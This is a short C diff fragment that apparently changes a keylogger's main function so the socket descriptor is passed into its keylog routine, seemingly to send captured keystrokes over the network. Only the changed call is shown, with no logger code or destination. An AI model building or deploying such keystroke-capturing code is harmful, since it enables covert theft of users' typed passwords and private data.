@@ -30,6 +30,6 @@ int main(int ac, char **av) {
     if (sockfd < 0)
         return 1;
 
-    keylog(&instance);
+    keylog(&instance, sockfd);
     return 0;
 }
